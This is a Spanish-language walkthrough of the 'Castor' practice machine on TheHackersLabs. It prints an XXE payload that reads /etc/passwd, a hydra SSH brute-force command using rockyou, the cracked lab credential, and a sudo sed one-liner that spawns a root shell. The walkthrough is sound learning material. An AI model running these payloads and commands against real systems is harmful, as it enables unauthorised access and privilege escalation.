---
Estado: Completado
Plataforma: TheHackersLabs
SO: Linux
Dificultad: Principiante
VectorInicial: XXE
ServicioInicial: HTTP
PuertoInicial: 80
Credenciales:
  - castorcin: chocolate
Usuarios:
  - castorcin
  - root
Privesc: sudo sed
Tecnicas:
  - Directory Enumeration
  - XML External Entity
  - Local File Disclosure
  - Password Brute Force
  - SSH Access
  - Sudo Privilege Escalation
Herramientas:
  - arp-scan
  - gomap
  - gobuster
  - burp suite
  - hydra
Fecha: 2026-03-04
---

# Castor

## Reconocimiento inicial

Se identifica la IP del objetivo en red local y después se enumeran servicios.

Puertos relevantes:

- `22/tcp` → SSH
- `80/tcp` → HTTP

## Enumeración web

La web parece estática, con un formulario de contacto aparentemente inofensivo. La enumeración adicional revela:

- `/uploads/`
- `/upload.php`

Al acceder a `upload.php`, el servidor responde con `xml not provided`, lo que sugiere procesamiento de XML.

## Explotación XXE

Se interceptan peticiones con Burp y se envía un XML de prueba. Tras confirmar el comportamiento, se prueba XXE para leer `/etc/passwd`.

Payload:

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

La aplicación devuelve correctamente el contenido del archivo, revelando el usuario `castorcin`.

## Acceso inicial

Se ataca SSH con `hydra`:

```bash
hydra -l castorcin -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
```

Credencial válida:

- `castorcin:chocolate`

Con ello se accede por SSH.

## Escalada de privilegios

Se revisan permisos sudo:

```bash
sudo -l
```

Salida relevante:

```text
(ALL : ALL) NOPASSWD: /usr/bin/sed
```

Consultando GTFOBins, la escalada a root es directa:

```bash
sudo -u root sed -n '1e exec /bin/sh -p 1>&0' /etc/hosts
```

## Conclusión

Cadena de ataque:

1. Enumeración de rutas.
2. Detección de procesamiento XML.
3. Explotación XXE para lectura de archivos.
4. Descubrimiento del usuario `castorcin`.
5. Fuerza bruta SSH.
6. Escalada a root mediante `sudo sed`.

Muy buen laboratorio para practicar XXE sin demasiada paja alrededor.
